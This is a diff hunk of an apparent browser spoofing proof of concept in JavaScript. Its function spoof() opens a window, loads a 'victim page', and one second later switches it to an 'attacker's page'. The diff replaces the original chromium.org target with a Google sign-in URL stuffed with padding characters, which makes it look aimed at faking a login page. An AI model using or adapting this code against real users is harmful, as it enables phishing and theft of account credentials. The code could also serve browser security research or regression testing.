@@ -4,7 +4,7 @@ function spoof() {
   w = window.open("about:blank");
 
   // Step 1: Load victim page.
-  w.location = "http://www.chromium.org";
+  w.location = "https://accounts.google.com/v3/signin/identifier&_cache_bust=1775198679202&padding=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
   // Step 2: Navigate to attacker's page.
   setTimeout('w.location = "bangga.html"', 1000);
